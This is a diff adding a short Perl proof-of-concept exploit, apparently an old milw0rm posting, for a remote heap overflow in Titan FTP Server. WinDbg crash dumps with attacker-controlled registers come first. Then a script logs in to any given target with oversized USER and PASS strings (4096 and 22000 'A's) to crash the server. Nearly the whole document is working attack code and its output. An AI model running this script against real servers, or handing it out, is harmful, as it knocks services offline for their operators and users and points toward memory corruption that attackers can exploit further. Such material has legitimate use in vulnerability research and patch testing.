@@ -1,0 +1,39 @@
+#Titan FTP SERVER REMOTE HEAP OVERFLOW(USER/PASS)
+#Impact : Critical
+#
+# Windbg Output:
+#(bec.528): Access violation - code c0000005 (first chance)
+#First chance exceptions are reported before any exception handling.
+#This exception may be expected and handled.
+#eax=41414141 ebx=00000000 ecx=07e415f4 edx=00000000 esi=41414141 edi=07e415f4
+#eip=004bbafa esp=06e4fb38 ebp=06e4fb5c iopl=0         nv up ei pl nz na po nc
+#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
+#srxTitan+0xbbafa:
+#004bbafa 8930             mov     [eax],esi         ds:0023:41414141=????????
+#
+# When reconnecting :
+#
+#(bec.c60): Access violation - code c0000005 (first chance)
+#First chance exceptions are reported before any exception handling.
+#This exception may be expected and handled.
+#eax=004bb991 ebx=00000000 ecx=41414141 edx=0129e4e8 esi=0129e4d4 edi=41414141
+#eip=004bb977 esp=0714fe7c ebp=0714fe9c iopl=0         nv up ei pl zr na po nc
+#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+#srxTitan+0xbb977:
+#004bb977 8b01             mov     eax,[ecx]         ds:0023:41414141=????????
+# 
+# Server crash after reconnecting. 
+# 
+#Here's the Poc
+use Net::FTP;
+(($target = $ARGV[0])) || die "usage:$0 <target> <port>";
+my $user = "A" x 4096;
+my $pass = "A" x 22000;
+print "Trying to connect to :$target...\n"; 
+$ftp = Net::FTP->new($target, Debug => 0, Port => 21) || die "could not connect";
+print "Connected!\n";
+$ftp->login($user, $pass); 
+print "Poc Successfull\n";
+$ftp->quit; 
+
+# milw0rm.com [2008-02-02]
